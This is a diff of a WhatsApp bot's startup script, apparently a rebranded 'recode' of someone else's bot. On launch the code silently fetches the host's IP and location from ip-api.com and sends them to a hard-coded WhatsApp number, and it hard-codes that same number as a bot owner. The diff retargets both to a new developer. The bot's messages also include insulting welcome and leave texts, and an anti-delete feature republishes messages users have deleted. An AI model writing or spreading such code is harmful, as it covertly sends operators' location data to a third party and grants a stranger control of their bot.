@@ -23,11 +23,11 @@ async function starts() {
 pemuda.autoReconnect = ReconnectMode.onConnectionLost
     pemuda.version = [ 2, 2143, 3 ]
     pemuda.logger.level = 'warn'
-    pemuda.browserDescription = ['Pemuda Teknologi','Desktop','3.0']
+    pemuda.browserDescription = ['Xprast Hunter','Desktop','3.0']
     await sleep(7000)
     pemuda.on('qr', qr => {
         qrcode.generate(qr, { small: true })
-        console.log(color('|TRM|'), color('Scan Kodenya bang', 'red'))
+        console.log(color('|TRM|'), color('Scan Kodenya Tod', 'red'))
     })
     fs.existsSync('./QRnya.json') && pemuda.loadAuthInfo('./QRnya.json')
     
@@ -44,7 +44,7 @@ pemuda.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       pemuda.sendMessage("6282252509320@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
+       pemuda.sendMessage("6281319182408@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xprast Hunter",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6281319182408?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
@@ -70,8 +70,8 @@ exec(`cd /sdcard/download && play *mp3`)
    
    pemuda.on('chat-update', async (mek) => {
         require('./pemuda.js')(pemuda, mek)
-        ownerNumber = ["6282252509320@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "6282252509320@s.whatsapp.net"
+        ownerNumber = ["6281319182408@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "6281319182408@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
         pemuda.on('group-participants-update', async (anu) => {
@@ -80,7 +80,7 @@ exec(`cd /sdcard/download && play *mp3`)
 		    try {
 			console.log(anu)
 			if (anu.action == 'add') {
-			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6281319182408-1632837946@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6281319182408:6281319182408\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 		    num = anu.participants[0]
 		    //Button ocument
 const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = 
@@ -103,17 +103,17 @@ pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
-						masuk =`Eh ads Member baru nih..\nHalo @${num.split('@')[0]}`
-		bumess = [{buttonId: `!000`, buttonText: {displayText: `Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n*AKU MAU KASIH TAU KALAU AKU ITU ANAK HASIL ZINA*`}, type: 1}]
+						masuk =`SELAMAT DATATANG TOD..\nHalo @${num.split('@')[0]}`
+		bumess = [{buttonId: `!000`, buttonText: {displayText: `Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n*TERIMA KASIH*`}, type: 1}]
 			const masukan = {
     contentText: `${masuk}`,
-    footerText: `Selamat Datang di › ${mdata.subject}\nKlik Oke Untuk Melanjutkan`,
+    footerText: `Jangan Jadi Beban Ya di › ${mdata.subject}\nKlik Oke Untuk Melanjutkan`,
     buttons: bumess,
     headerType: 1
 }
-			pemuda.sendMessage(mdata.id, masukan, MessageType.buttonsMessage, fs.readFileSync('./media/sampah/pemuda'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/script.jpg'), filename:`Tes cok`}, {quoted:m.message, contextInfo: {"mentionedJid": [m.participant]}, forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Download Script`,mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}})
+			pemuda.sendMessage(mdata.id, masukan, MessageType.buttonsMessage, fs.readFileSync('./media/sampah/pemuda'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/script.jpg'), filename:`Tes cok`}, {quoted:m.message, contextInfo: {"mentionedJid": [m.participant]}, forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Download Script`,mediaType:"2",thumbnail:buff,mediaUrl:`https://youtube.com/channel/UCWvEpbAFpEGZPy7dsSMsm0g`}})
 			} else if (anu.action == 'remove') {
-			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6281319182408-1632837946@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6281319182408:6281319182408\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 			num = anu.participants[0]
 			try {
 			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
@@ -121,8 +121,8 @@ pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
-			keluarkan =`Yahh, ada yang keluar 😭\nSelamat tinggal @${num.split('@')[0]}\nSemoga gak jadi beban lagi disini :v`
-		bumesss = [{buttonId: `!000`, buttonText: {displayText: 'Goodbye‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nDia Pacarku guys, Kita Ngegay udah lama, gak tau kenapa tiba2 Keluar grup 😭'}, type: 1}]
+			keluarkan =`Kalau keluar pamit dlu ajg\nSi beban @${num.split('@')[0]}\nGo to the hell :v`
+		bumesss = [{buttonId: `!000`, buttonText: {displayText: 'Goodbye‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nJangan balik lagi ya...!!'}, type: 1}]
 			const Keluarlah = {
     contentText: `${keluarkan}`,
     footerText: `Beban Grup › ${mdata.subject}`,
@@ -211,10 +211,10 @@ pemudadelete = `*「 PESAN DITARIK TERDETEKSI 」*
 › Dari : *@${m.participant.split("@")[0]}*
 › Waktu : ${jam}
 › Tanggal : ${calender}`
-button = [{buttonId: `!000`, buttonText: {displayText: 'Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nYahh gpp Sumpah , fiturnya sangat membantu para pelaku Penjahat Kelamin :)'}, type: 1}]
+button = [{buttonId: `!000`, buttonText: {displayText: 'Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nʟᴀɪɴ ᴋᴀʟɪ ᴊᴀɴɢᴀɴ ᴜɴsᴇɴᴇ ᴄʜᴀᴛ..﹗﹗'}, type: 1}]
 const buMess = {
     contentText: `${pemudadelete}`,
-    footerText: 'Anti Delete › Pesan ini telah di hapus',
+    footerText: 'ᴀɴᴛɪ ᴅᴇʟᴇᴛᴇ › ᴛᴇʀᴄʏᴅᴜᴋ ᴩᴇsᴀɴ ɪɴɪ ᴛᴇʟᴀʜ ᴅɪʜᴀᴩᴜs',
     buttons: button,
     headerType: 1
 }
@@ -233,7 +233,7 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('Subcribe : Pemuda Teknologi', 'red'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('BOT SUDAH AKTIF', 'red'))})}, 200 ) ;
 	}
 	else
 	{
@@ -246,10 +246,10 @@ console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		vertivalLayout: 'default',
 		width: 50,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by Pemuda Teknologi' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by Xprast17' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
-	title: '\n\nLoading cuyy' ,
+	title: '\n\nSabar Anjing' ,
 	eta: true ,
 	percent: true
 } ) ;
